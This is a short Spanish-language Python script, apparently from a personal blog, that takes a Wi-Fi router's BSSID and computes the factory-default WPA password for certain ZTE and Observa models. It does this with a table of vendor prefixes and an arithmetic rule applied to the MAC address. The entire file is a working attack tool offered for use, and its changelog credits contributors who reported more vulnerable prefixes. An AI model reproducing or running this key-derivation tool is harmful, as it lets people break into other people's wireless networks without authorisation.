#!/bin/python

"""
Escrito por: Alguien
Blog: http://blog.alguien.at/
Fecha: 26/01/2014

Historial de cambios:
#####################

26/01/2014    Primer commit
05/04/2014    Agregar OUI F86180 reportado por Miguel Mallma
07/04/2014    Agregar OUI F87F35 reportado por @francis2077
29/04/2014    Soporte para OUI F8C346 de la marca Observa
07/05/2014    Agregar OUI F86394 marca Observa (aporte anonimo)
07/05/2014    Resuelta incompatibilidad con python3 (reportado por jon4)
"""

import sys

zteOUI = {
    'F827C5': '2C26C5',
    'F8E1CF': '34E0CF',
    'F8ED80': 'A0EC80',
    'F8038E': 'DC028E',
    'F83F61': 'F43E61',
    'F86180': '146080',   # Aporte por Miguel Mallma
    'F87F35': 'CC7B35'    # Aporte por @francis2077
}

observaOUI = {
    'F8C346': 'E4C146',   # Aporte anonimo
    'F86394': 'D86194'    # Aporte anonimo
}


def get_prefix(oui=""):
    if oui in zteOUI.keys():
        return "Z%s" % (zteOUI[oui])
    if oui in observaOUI.keys():
        return "O%s" % (observaOUI[oui])
    return None


def main():
    if len(sys.argv) != 2:
        print("Uso: %s <BSSID>" % (sys.argv[0]))
        print("Ej.: %s 1A:2B:3C:4D:5E:6F" % (sys.argv[0]))
        exit(1)

    mac = sys.argv[1].upper()
    partes = mac.split(":")

    if len(partes) != 6 or len(mac) != 17:
        print("Esto no es una MAC valida: %s" % mac)
        exit(1)

    oui = "".join(partes)
    oui = oui[0:6]

    prefix = get_prefix(oui)
    if prefix is None:
        print("Lo siento, no conosco ese OUI: %s" % oui)
        exit(1)

    final = hex(int("".join(partes[3:]), 16) - 9).upper()[2:]
    final = "0" * (6 - len(final)) + final

    defpwd = "%s%s" % (prefix, final)
    print("La clave WPA por defecto es: %s" % defpwd)
    print("Terminado };]")


if __name__ == "__main__":
    main()
